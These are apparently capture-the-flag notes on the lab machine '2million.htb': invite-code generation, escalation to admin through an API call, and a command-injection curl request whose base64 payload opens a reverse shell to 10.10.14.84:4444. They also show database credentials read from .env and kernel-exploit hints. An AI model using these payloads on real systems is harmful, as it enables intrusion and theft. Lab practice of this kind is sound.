
# nmap scan
```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 02:43 CST
Nmap scan report for 10.129.237.195
Host is up (0.21s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


### open ports

22 - 8.9p1 
80 - nginx / http://2million.htb/

# http port 80

/invite 
- inviteapi.min.js
```javascript
function verifyInviteCode(code) { var formData = {"code": code}; $.ajax({ type: "POST", dataType: "json", data: formData, url: '/api/v1/invite/verify', success: function(response) { console.log(response); }, error: function(response) { console.log(response); } }); } function makeInviteCode() { $.ajax({ type: "POST", dataType: "json", url: '/api/v1/invite/how/to/generate', success: function(response) { console.log(response); }, error: function(response) { console.log(response); } }); }
```

> found 2 endpoints /api/v1/invite/verify /api/v1/invite/how/to/generate
- /api/invite/how/to/generate

```shell
curl -X POST 2million.htb/api/v1/invite/how/to/generate  | jq
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}

```
> invoked the post call on the terminal using curl and jq (command formatting tool for json)


> the response contains rot 13 encrypted data which also contains an endpoint that can generate invite codes on the site

```shell
echo "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
In order to generate the invite code, make a POST request to /api/v1/invite/generate


curl -X POST 2million.htb/api/v1/invite/generate  | jq
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "WElVMUEtU0FXT1ItOVVISTYtTDBDT1E=",
    "format": "encoded"
  }
}

```

> /api/v1 displays all endpoints which leads to finding /api/v1/admin/settings/update where it escalate our user to admin 

```shell
curl -sv -X PUT 2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" --cookie "PHPSESSID=07miuukrpdpe7ktcj6dq79shei" -d '{"email":"test123@gmail.com", "is_admin":1}'

```

> /api/v1/admin/generate/vpn is vulnerable to os command injection on the username parameter 

```shell
curl -sv -X POST 2million.htb/api/v1/admin/vpn/generate -H "Content-Type: application/json" --cookie "PHPSESSID=07miuukrpdpe7ktcj6dq79shei" -d '{"username":"test;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0Ljg0LzQ0NDQgMD4mMQ==|base64 -d|/bin/bash"}'

```


# Privilege escalation

> found credentials on /html directory, .env file contains admin user credentials

```shell
www-data@2million:~/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123

```

> executed linpeas

```shell
╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

```

> found an email that mentions kernel vulnerability /var/mail/admin

```shell
I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

```

> OS distro has a vulnerability


```shell
lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 22.04.2 LTS
Release:	22.04
Codename:	jammy

```